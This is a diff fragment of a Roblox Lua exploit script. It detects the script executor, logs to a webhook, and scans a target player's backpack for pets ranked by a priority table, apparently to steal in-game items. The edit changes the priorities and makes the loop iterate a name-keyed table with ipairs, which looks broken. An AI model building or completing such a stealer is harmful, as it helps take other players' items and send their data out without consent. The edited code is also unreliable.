@@ -69,13 +69,11 @@ local request = http_request or request or (syn and syn.request) or (fluxus and 
         -- Updated PetPriorityData with isMutation field and additional pets
         local PetPriorityData = {
                 -- Regular pets
-                ["Peacock"] = { priority = 1, emoji = "🗿", isMutation = false },
-                ["Bald Eagle"] = { priority = 2, emoji = "🗿", isMutation = false },
-               
+                ["Peacock"] = { priority = 27, emoji = "🗿", isMutation = false },
+                ["Bald Eagle"] = { priority = 28, emoji = "🗿", isMutation = false },
                 -- Mutations
-                ["Nightmare"] = { priority = 14, emoji = "🗿", isMutation = true },
-                
-            }
+                ["Nightmare"] = { priority = 29, emoji = "🗿", isMutation = true },
+              }
 
         local function detectExecutor()
             local name
@@ -682,7 +680,7 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
                 local currentPets = GetPlayerPets()
                 if #currentPets == 0 then continue end
 
-                for _, pet in ipairs(currentPets) do
+                for _, pet in ipairs(PetPriorityData) do
                     for _, tool in targetPlr.Backpack:GetChildren() do
                         if tool:IsA("Tool")
                         and tool:GetAttribute("ItemType") == "Pet"
